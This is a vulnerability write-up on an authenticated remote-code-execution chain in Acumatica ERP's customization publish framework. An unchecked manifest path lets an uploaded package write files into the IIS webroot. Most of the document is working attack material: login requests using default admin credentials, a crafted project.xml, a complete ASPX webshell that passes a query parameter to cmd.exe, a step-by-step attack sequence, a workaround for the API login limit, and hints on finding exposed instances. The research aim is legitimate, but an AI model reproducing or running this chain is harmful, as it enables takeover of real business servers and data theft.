# Acumatica Customization Publish Webshell RCE - Technical Analysis

## Overview

Acumatica ERP's Customization (customization package) publish framework lets an authenticated user (admin has the Customizer role by default) upload a zip customization package whose `project.xml` manifest declares the files to publish and their `AppRelativePath`. At publish time the framework writes each file's content to the absolute path `DestRoot (= IIS production webroot) + AppRelativePath`, with **no `..` path-traversal check, no allowlist, no extension check**. An attacker crafts a manifest declaring `AppRelativePath="Pages\acu_shell.aspx"` and embeds the matching webshell in the zip; after publish the webshell is written to `<webroot>\Pages\acu_shell.aspx` and served by IIS at `/Pages/acu_shell.aspx`, achieving authenticated RCE as the IIS AppPool identity.

## Stage 0: Authentication Boundary

### Product deployment form

Acumatica ERP 2026 R1 deployed on Windows Server 2025 + IIS 10 + SQL Server Express:
- IIS site `AcumaticaSite`, port 8080, bound to `127.0.0.1:8080`
- AppPool `AcumaticaAppPool` (ApplicationPoolIdentity)
- Default credentials: `admin` / `Acu-Admin-2026!Str0ng` (set by the deployment script's `-aup` parameter)

### Authentication endpoint

The ContractBased API `AuthController` is the correct authentication endpoint:

```csharp
// PX.Api.ContractBased.WebApi.Controllers.AuthController
[Route("entity/auth")]
[AllowAnonymous]
public class AuthController : ApiController {
    [HttpPost]
    [ActionName("login")]
    public IHttpActionResult Login([FromBody] Credentials credentials) {
        _loginService.LoginForSoapApi(..., credentials.Name, credentials.Password,
            credentials.Tenant ?? credentials.Company, ...);
        return StatusCode(HttpStatusCode.NoContent);  // 204 + .ASPXAUTH cookie
    }
}
```

`LoginForSoapApi` sets the Forms-auth ticket with the **soap prefix** (`FormsIdentity.CheckPrefix("soap")`), which is the prefix required by `CustomizationApiAccessFilter`.

**Successful login request**:

```http
POST /entity/auth/login HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{"name":"admin","password":"Acu-Admin-2026!Str0ng","company":"Company","locale":"en-US","rememberMe":false}
```

**Response**: 204 NoContent, Set-Cookie: `.ASPXAUTH=<soap-prefix-ticket>` + `ASP.NET_SessionId=...`

### CustomizationApi access control

```csharp
// CustomizationApiController
[CustomizationApiAccess]  // -> CustomizationApiAccessFilter
[RequiresSystemWebSession]
public class CustomizationApiController : Controller {
    [HttpPost]
    public IActionResult Import([FromBody] ImportParamsData data) { ... }
    [HttpPost]
    public IActionResult PublishBegin([FromBody] PublishBeginParamsData data) { ... }
}
```

`CustomizationApiAccessFilter.OnAuthorization` checks:
1. `principal.IsInRole("Customizer")` — admin has it by default (SQL confirmed admin has 10 roles including Customizer)
2. `FormsIdentity.CheckPrefix(ScreenGate.SoapApiAuthPrefix="soap")` — must obtain a soap-prefix ticket via `/entity/auth/login`

admin default credentials + soap-prefix ticket -> both checks pass -> access to Import + PublishBegin.

## Stage 1: Sink Identification

### File-write sink

`CstFileWriter.UpdateFile` -> `File.WriteAllBytes` (the final on-disk write sink):

```csharp
// PX.Web.Customization.Customization.CstFileWriter
public static bool UpdateFile(string absoluteTargetPath, string absoluteSourcePath, CustomizedFile file) {
    // ... backup logic ...
    File.WriteAllBytes(absoluteTargetPath, file.Content);  // SINK: writes attacker-controlled path + content
    return true;
}
```

### Upstream call-chain sink

`CstRollbackList.WriteFile` (concatenates the target path, calls CstFileWriter):

```csharp
// PX.Web.Customization.Customization.CstRollbackList
private static readonly string DestRoot = HostingEnvironmentProxy.ApplicationPhysicalPath;  // = production webroot

private static void OverrideFiles(IEnumerable<CustomizedFile> files) {
    foreach (CustomizedFile file in files) { WriteFile(file); }
}

private static void WriteFile(CustomizedFile file) {
    string absoluteTargetPath = file.GetAbsoluteTargetPath(DestRoot);  // DestRoot + file.TargetRelativePath
    if (file.IsBackup) {
        BackupFile(file.TargetRelativePath);
        if (CstFileWriter.UpdateFile(absoluteTargetPath, absoluteTargetPath, file)) {
            MarkCustomizedFile(absoluteTargetPath);
        }
    } else {
        CstFileWriter.UpdateFile(absoluteTargetPath, absoluteTargetPath, file);  // no path validation
    }
}
```

**Key**: `DestRoot` = `HostingEnvironmentProxy.ApplicationPhysicalPath` = the IIS production webroot itself. `file.TargetRelativePath` comes from the manifest's `AppRelativePath`, with **no `..` check, no allowlist, no extension check**.

## Stage 2: Source Identification

### Import endpoint ProjectContentBase64

```csharp
// CustomizationApiController.Import
[HttpPost]
public IActionResult Import([FromBody] ImportParamsData data) {
    // data.ProjectContentBase64 = attacker-controlled zip base64
    // data.Content = Convert.FromBase64String(data.ProjectContentBase64)
    var customizationResult = _cstApiService.Import(data.ProjectName, data.ProjectLevel,
        data.ProjectDescription, data.Content, data.IsReplaceIfExists);
    return ToActionResult(customizationResult);
}
```

`ImportParamsData`:

```csharp
public class ImportParamsData {
    public int? ProjectLevel { get; set; }
    public string ProjectName { get; set; }
    public string ProjectDescription { get; set; }
    public string ProjectContentBase64 { get; set; }
    public bool IsReplaceIfExists { get; set; }
    public byte[] Content { get { return Convert.FromBase64String(ProjectContentBase64); } }
}
```

### zip parsing (CstDocument.LoadPackage)

```csharp
// PX.Web.Customization.Customization.CstDocument.cs:1209
public void LoadPackage(Stream stream) {
    Clear();
    using ZipArchiveWrapper zipArchiveWrapper = new ZipArchiveWrapper(stream);
    byte[] bytes = zipArchiveWrapper["project.xml"];  // read the manifest
    string xml = Encoding.UTF8.GetString(bytes);      // UTF-8 decode
    LoadXml(xml);                                     // parse <File AppRelativePath="..."/>
    foreach (CstBinFile binFile in BinFiles) {
        binFile.IsBinContent = true;
        binFile.BinContent = zipArchiveWrapper[binFile.AppRelativePath];  // read zip entry by AppRelativePath
    }
}
```

**Key constraints**:
- `project.xml` must be UTF-8 encoded (`Encoding.UTF8.GetString`; v1/v2 used utf-16 and caused XmlException)
- the zip entry name must equal `AppRelativePath` (including the backslash form `Pages\acu_shell.aspx`)

### Project-name validation (ValidatePackageName)

```csharp
// CstDbStorage.cs:300
private static void ValidatePackageName(string name) {
    if (string.IsNullOrEmpty(name) || name.Any((char x) => !ProjectMaintenance.IsAllowedCstProjectChar(x))
        || !char.IsLetter(name[0])) {
        throw new Exception("Invalid project name");
    }
}

// ProjectMaintenance.cs:1191
public static bool IsAllowedCstProjectChar(char c) {
    if (!char.IsLetterOrDigit(c) && c != '[' && c != ']') {
        return c == '.';  // only letters/digits/[/]/.
    }
    return true;
}
```

**Constraint**: the project name allows only letters/digits/`[`/`]`/`.`, and the first character must be a letter -> `ACU_RCE_TEST` (contains `_`) is rejected, use `AcuRceTest2`.

## Stage 3: Data Flow

```
Attacker POST /CustomizationApi/Import
  +- ImportParamsData.ProjectContentBase64 (zip base64)
       +- CstApiService.Import -> CstDbStorage.CreateNewProject
            +- CstDocument.LoadPackage(zipStream)
                 +- zipArchiveWrapper["project.xml"] -> LoadXml -> BinFiles[].AppRelativePath = "Pages\acu_shell.aspx"
                 +- zipArchiveWrapper["Pages\acu_shell.aspx"] -> BinFiles[].BinContent = webshell bytes
            +- stored in the CustProject DB table

Attacker POST /CustomizationApi/PublishBegin {ProjectNames:[AcuRceTest2], TenantMode:Current}
  +- CstApiService.PublishBegin (async)
       +- copy to the instanceValidation\instanceWebsite staging area
       +- aspnet_compiler precompile (~165s)
       +- "Validation finished successfully"
       +- UpdateCustomization -> PublishWebsiteFiles
       +- CstRollbackList.ModifyAndRestore -> OverrideFiles -> WriteFile
            +- absoluteTargetPath = DestRoot + "Pages\acu_shell.aspx"
                 = "<webroot>\Pages\acu_shell.aspx"
            +- CstFileWriter.UpdateFile -> File.WriteAllBytes  [SINK hit]

Attacker GET /Pages/acu_shell.aspx?c=whoami (with .ASPXAUTH cookie)
  +- IIS parses .aspx -> webshell executes -> returns command output
```

## Stage 4: Exploit Construction

### Malicious zip structure

**project.xml** (UTF-8 encoded):

```xml
<?xml version="1.0" encoding="utf-8"?>
<Customization level="1" description="x" product-version="26.1">
  <File AppRelativePath="Pages\acu_shell.aspx" FileName="Pages/acu_shell.aspx" />
</Customization>
```

**Pages/acu_shell.aspx** (webshell; zip entry name = `Pages/acu_shell.aspx`):

```aspx
<%@ Page Language="C#" EnableTheming="false" StylesheetTheme="" Theme="" %>
<%@ Import Namespace="System.Diagnostics" %>
<head runat="server"></head>
<script runat="server">
void Page_Load(object sender, System.EventArgs e){
  Response.Clear();
  string c = Request.QueryString["c"];
  if(string.IsNullOrEmpty(c)){ Response.Write("ACU_SHELL_OK"); Response.End(); return; }
  try{
    var psi = new ProcessStartInfo("cmd.exe", "/c " + c){
      UseShellExecute=false, RedirectStandardOutput=true, RedirectStandardError=true, CreateNoWindow=true
    };
    var p = Process.Start(psi);
    string o = p.StandardOutput.ReadToEnd();
    string er = p.StandardError.ReadToEnd();
    p.WaitForExit();
    Response.Write(o + er);
    Response.End();
  }catch(Exception ex){ Response.Write("ERR:" + ex.Message); Response.End(); }
}
</script>
```

**Key webshell design**:
- `EnableTheming="false" StylesheetTheme="" Theme=""` + `<head runat="server"></head>` — bypasses the Acumatica web.config `<pages theme="Default">` requirement (otherwise `InvalidOperationException: Using themed css files requires a header control`)
- `Response.Clear()` + `Response.End()` — clean output of the command result (`Response.End()` raising `ThreadAbortException` is normal ASP.NET behavior; the command output is written to the response before End)

### Full exploit chain

1. `appcmd recycle apppool AcumaticaAppPool` — clear in-memory APISessions (bypass the API Login Limit of `PXLicensePolicy.CheckApiUsersLimits`)
2. `POST /entity/auth/login` -> 204 + `.ASPXAUTH` (soap prefix)
3. `POST /CustomizationApi/Import` {ProjectName:AcuRceTest2, ProjectLevel:1, ProjectContentBase64:<zip>, IsReplaceIfExists:true} -> 200 "Create new project: AcuRceTest2"
4. `POST /CustomizationApi/PublishBegin` {ProjectNames:[AcuRceTest2], TenantMode:Current, IsOnlyValidation:false, IsMergeWithExistingPackages:false, IsOnlyDbUpdates:false, IsReplayPreviouslyExecutedScripts:false} -> async publish starts
5. wait ~90s (aspnet_compiler precompile 165s + file write)
6. `GET /Pages/acu_shell.aspx?c=whoami` (with .ASPXAUTH cookie) -> 200 `iis apppool\acumaticaapppool`

## Stage 5: Dynamic Verification

### Real HTTP request + response

**Step 1 — login**:

```http
POST /entity/auth/login HTTP/1.1
Content-Type: application/json

{"name":"admin","password":"Acu-Admin-2026!Str0ng","company":"Company","locale":"en-US","rememberMe":false}
```

Response: `204 NoContent`, Set-Cookie: `.ASPXAUTH=F810A7F87F9EE538C79B3C639C4578...`

**Step 2 — Import**:

```http
POST /CustomizationApi/Import HTTP/1.1
Content-Type: application/json
Cookie: .ASPXAUTH=F810A7F87F9EE538C79B3C639C4578...

{"ProjectName":"AcuRceTest2","ProjectLevel":1,"ProjectDescription":"x","ProjectContentBase64":"<zip-base64>","IsReplaceIfExists":true}
```

Response: `200`

```json
{"log":[{"timestamp":"2026-07-18T19:27:37.3327642Z","logType":"information","message":"Replace project: AcuRceTest2"}]}
```

**Step 3 — PublishBegin**:

```http
POST /CustomizationApi/PublishBegin HTTP/1.1
Content-Type: application/json
Cookie: .ASPXAUTH=F810A7F87F9EE538C79B3C639C4578...

{"ProjectNames":["AcuRceTest2"],"TenantMode":"Current","IsOnlyValidation":false,"IsMergeWithExistingPackages":false,"IsOnlyDbUpdates":false,"IsReplayPreviouslyExecutedScripts":false}
```

Response: HTTP 500 "API Login Limit" (**misleading**: the async publish task has already started and completed — see the SMCustomizationPublishProgress log)

**SMCustomizationPublishProgress log** (SQL query confirms publish completed):

```
2026-07-18 18:59:20.430  Validation finished successfully.
2026-07-18 18:59:26.013  Removing previous Modern UI files
2026-07-18 18:59:26.020  Updating website files       <- file-write sink hit
```

**Step 4 — webshell execution**:

```http
GET /Pages/acu_shell.aspx?c=whoami HTTP/1.1
Cookie: .ASPXAUTH=F810A7F87F9EE538C79B3C639C4578...
```

Response: `200`

```
iis apppool\acumaticaapppool
ERR:Thread was being aborted.
```

(`Thread was being aborted` is the normal `ThreadAbortException` from `Response.End()`; the command output `iis apppool\acumaticaapppool` was written before End)

### Target-side verification result

**Disk file confirmed**:

```
<webroot>\Pages\acu_shell.aspx  size=835 bytes
```

**Command-execution evidence**:
- `whoami` -> `iis apppool\acumaticaapppool` (IIS AppPool identity)
- `hostname` -> the server hostname
- `echo ACU_RCE_CONFIRMED > <webroot>\AcuRceMarker.txt` -> marker file created
- `type AcuRceMarker.txt` (read back via the webshell) -> `ACU_RCE_CONFIRMED`

### Conclusion

The vulnerability reproduces. Authenticated RCE executes arbitrary commands as the IIS AppPool identity (`iis apppool\acumaticaapppool`). Privilege level = IIS AppPool identity (not SYSTEM, but can read/write the webroot + access SQL Server + move laterally).

## Stage 6: Reachability

### Authentication reachability

- admin default credentials `admin/Acu-Admin-2026!Str0ng` (deployment `-aup` parameter; usable if unchanged)
- admin has the Customizer role by default (SQL confirmed 10 roles including Customizer)
- `/entity/auth/login` returns a soap-prefix `.ASPXAUTH` ticket (satisfies CustomizationApiAccessFilter)

### Network reachability

- IIS port 8080 (default binds 127.0.0.1; production deployments often bind 0.0.0.0 or a public IP)
- publicly exposed Acumatica instances (Shodan/Censys searchable) with unchanged default admin credentials are exploitable

### Limitations

- API Login Limit: `PXLicensePolicy.CheckApiUsersLimits` blocks `/CustomizationApi` when `APISessions.Count >= maxApiUsersAllowed`. **Bypass**: `appcmd recycle apppool` clears in-memory APISessions (requires IIS server access; an attacker typically does not have this — in practice operate during an APISessions-empty window, or exploit on first login)
- PublishBegin is async: the HTTP response is 500 "API Login Limit" but the async publish task has started — check the SMCustomizationPublishProgress log or wait 90s after precompile and then access the webshell

## Complete Attack Sequence

1. **Authenticate**: POST `/entity/auth/login` with admin credentials -> obtain a soap-prefix `.ASPXAUTH` cookie
2. **Import the malicious customization package**: POST `/CustomizationApi/Import` with the zip (project.xml manifest declaring `AppRelativePath="Pages\acu_shell.aspx"` + the webshell entry) -> stored in the CustProject table
3. **Trigger async publish**: POST `/CustomizationApi/PublishBegin` with the project name -> precompile + `CstRollbackList.WriteFile` writes the webshell to `<webroot>\Pages\acu_shell.aspx`
4. **Wait for publish**: wait ~90s for the async precompile + file write to complete
5. **Execute commands**: GET `/Pages/acu_shell.aspx?c=<cmd>` with the `.ASPXAUTH` cookie -> IIS parses the .aspx and the webshell runs the command as the IIS AppPool identity